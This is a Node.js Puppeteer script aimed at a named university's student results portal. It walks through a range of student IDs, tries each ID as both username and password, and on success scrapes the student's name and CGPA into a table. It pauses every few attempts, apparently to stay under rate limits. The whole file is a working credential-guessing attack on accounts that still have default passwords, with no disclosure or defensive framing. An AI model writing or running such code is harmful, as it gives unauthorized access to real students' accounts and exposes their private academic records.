const puppeteer = require("puppeteer");

const baseUrl = "https://nubtkhulna.ac.bd/ter";
const startId = parseInt(process.argv[2]);
const endId = parseInt(process.argv[3]);
const delay = (ms) => new Promise(res => setTimeout(res, ms));

(async () => {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    await page.setDefaultNavigationTimeout(60000);

    const unchanged = [];

    for (let i = startId; i <= endId; i++) {
        const userId = `CSE160320${String(i).padStart(3, "0")}`;
        console.log(`🔍 Trying: ${userId}`);

        try {
            await page.goto(`${baseUrl}/login`, { waitUntil: "networkidle2", timeout: 60000 });
            await page.type("#username", userId);
            await page.type("#password", userId);

            await Promise.all([
                page.click("button[type=submit]"),
                page.waitForNavigation({ waitUntil: "networkidle2", timeout: 60000 }),
            ]);

            if (page.url().includes("/panel")) {
                console.log(`✅ Login success: ${userId}`);

                await page.goto(`${baseUrl}/panel/overallresult`, { waitUntil: "networkidle2", timeout: 60000 });

                const result = await page.evaluate(() => {
                    const nameCell = Array.from(document.querySelectorAll("td")).find(td =>
                        /^[A-Za-z\s.]+$/.test(td.textContent.trim())
                    );
                    const cgpaCell = Array.from(document.querySelectorAll("b")).find(b =>
                        /^\d+\.\d{1,3}$/.test(b.textContent.trim())
                    );
                    return {
                        name: nameCell?.textContent?.trim() || "Unknown",
                        cgpa: cgpaCell?.textContent?.trim() || "N/A",
                    };
                });

                unchanged.push({ id: userId, ...result });

                await page.goto(`${baseUrl}/login/signout`, { waitUntil: "networkidle2", timeout: 60000 });
                await page.deleteCookie(...await page.cookies());
            } else {
                console.log(`❌ Login failed: ${userId}`);
            }
        } catch (err) {
            console.error(`⏱️ Timeout or error for ${userId}: ${err.message}`);
        }

        if (i % 5 === 0) {
            console.log("⏳ Waiting 10 seconds after 5 users...");
            await delay(10000); // 10s pause every 5 users
        }
    }

    await browser.close();

    console.log("\n📋 Batch Result:");
    console.table(unchanged);
})();
